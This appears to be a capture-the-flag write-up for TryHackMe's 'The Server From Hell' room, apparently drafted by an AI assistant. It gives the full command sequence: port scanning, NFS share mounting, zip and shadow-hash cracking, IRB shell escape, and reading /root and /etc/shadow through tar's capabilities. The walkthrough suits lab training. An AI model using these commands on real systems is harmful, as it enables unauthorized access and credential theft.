# The Server From Hell - Writeup (English)

### ✨ Introduction
**The Server From Hell** is a Linux CTF room on TryHackMe focused on full-system exploitation: enumerating hidden ports, finding a misconfigured NFS share, cracking a zip file, using an SSH key to log in, and abusing Linux capabilities to get a root shell.

## 🎯 Goal
- Find hidden ports/services and verify behavior with `nc`
- Use **NFS (2049/tcp)** misconfiguration to retrieve an SSH key
- Escape from **IRB (Interactive Ruby)** into a real shell
- Use **/bin/tar**’s capabilities to read protected files → obtain root hashes
- Crack hashes to get root password → `su root` and capture the flag

# 🧠 TryHackMe - The Server From Hell

**Category:** CTF / Boot-to-Root  
**Difficulty:** Medium  
**Mode:** Boot-to-Root CTF  
**URL:** https://tryhackme.com/room/theserverfromhell  
**Author:** Thanyakorn

---

## 📚 Table of Contents
- 🔎 1) Recon & Port Scan  
- 🧵 2) Banner / Manual Check with `nc`  
- 📦 3) NFS Enumeration & Mount  
- 🔑 4) SSH using extracted key  
- 🧯 5) Escape IRB → get real Bash  
- 🧗 6) Privilege Escalation via Linux Capabilities (`tar`)  
- 🧨 7) Crack `/etc/shadow` → `su root`  
- 🏁 8) Workflow Summary + Lessons

---

## 📌 Challenge Note
> “Start at port 1337 and enumerate your way. Good luck.”

## 🔍 1. Recon & Port Scan
Start with:
```bash
nmap -sC -sV -Pn <TARGET_IP>
```
- `-sC` → run Nmap default scripts (NSE) for deeper info (SSL certs, anonymous FTP, SSH fingerprints)
- `-sV` → service/version detection
- `-Pn` → treat host as up (skip ping)

For speed you can use:
```bash
nmap -sV -vv <TARGET_IP>
```

### ℹ️ Scan Analysis
The scan reveals many open ports (20+). There are also odd high ports like `10628`, `16000`, `2607`, `5001` that may be custom services or deliberate honeyports used in a CTF.

## 📡 2. Banner & Web Service Checks
> “Start at port 1337 and enumerate your way. Good luck.”

So we `nc` to port 1337:
```bash
nc <TARGET_IP> 1337
```

Output:
```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

This hints to scan ports **1–100** and print banners to locate the “trollface”.

## 🌐 3. Scan ports 1–100 (per hint)
Use `nc` for ports 1–100 to find odd banners. Example:
```bash
nc <TARGET_IP> 1
nc <TARGET_IP> 2
...
```

Automate with:
```bash
for i in {1..100}; do nc -w 2 <TARGET_IP> $i | sed -n '1p'; echo; done > results.txt
```

If output contains `go to port 12345`, connect:
```bash
nc <TARGET_IP> 12345
```
You may see:
```
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

## 📂 4. Enumerate & mount NFS share
Check exports:
```bash
showmount -e <TARGET_IP>
# Example output:
# Export list for <TARGET_IP>:
# /home/nfs *
```

Mount:
```bash
mkdir mount
mount -o ro <TARGET_IP>:/home/nfs mount
ls -la mount
```

Look for `backup.zip` or keys.

## 🔎 Found `backup.zip` → crack with a wordlist
```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
# found: zxcvbnm
cp mount/backup.zip .
unzip backup.zip   # use password zxcvbnm
```

Files extracted (example):
- `home/hades/.ssh/id_rsa` (private key)
- `home/hades/.ssh/hint.txt`
- `home/hades/.ssh/authorized_keys`
- `home/hades/.ssh/flag.txt`
- `home/hades/.ssh/id_rsa.pub`

## 📂 5. Next steps after extracting `backup.zip`
```bash
cd home
ls -la        # see hades
cd hades
ls -la        # see .ssh
cd .ssh
ls -la        # authorized_keys, flag.txt, hint.txt, id_rsa, id_rsa.pub
```

Check `id_rsa`, `authorized_keys`, and `hint.txt`.

## 🔑 6. Try SSH (hint: ports 2500–4500)
Read hint:
```bash
cat hint.txt   # output: 2500-4500
```

Example attempts:
```bash
ssh hades@<TARGET_IP> -p 2500
ssh hades@<TARGET_IP> -p 2501
...
```

Automate:
```bash
for p in {2500..4500}; do
  ssh -i id_rsa -o ConnectTimeout=3 -o BatchMode=yes -p $p hades@<TARGET_IP> 'echo OK' 2>/dev/null && echo "SUCCESS $p" && break
done
```
Found SSH on port `3333` (example). Use:
```bash
chmod 600 id_rsa
ssh -i id_rsa hades@<TARGET_IP> -p 3333
```

### Why key-based auth works without a password
- `id_rsa` is the private key; the server has the matching public key in `authorized_keys`. SSH authenticates via signature, not password.

## 🔓 7. From `irb` → escape to `/bin/bash`
After connecting you may land in `irb`. Use GTFOBins entry:
```ruby
exec '/bin/bash'
```
Then upgrade TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

## 🔍 Two ways to find `root.txt`
### 1) Use Linux capabilities (recommended)
```bash
getcap -r / 2>/dev/null
# /usr/bin/mtr-packet = cap_net_raw+ep
# /bin/tar           = cap_dac_read_search+ep
```
Use tar to archive `/root` and extract to /tmp:
```bash
cd /tmp
tar -cvf test.tar /root
tar -xvf test.tar
ls -la root
cat root/root.txt
```

### 2) Extract `/etc/shadow`, crack root hash, `su root`
```bash
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -C /tmp
cat /tmp/etc/shadow
# copy hash to attacker, then:
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt roots.hash
john --show roots.hash
# use cracked password:
su root
```

## Cleanup (optional)
```bash
rm -f /tmp/test.tar
rm -rf /tmp/root
umount mount
```

## Notes / Defensive Recommendations
- Do not grant unnecessary capabilities to binaries (use `setcap -r /bin/tar` to remove).
- Avoid leaving backups, keys, or sensitive files accessible via NFS.
- Harden SSH and disable root login if not needed.

---

If you want, I saved this as **README_EN.md** in the workspace.

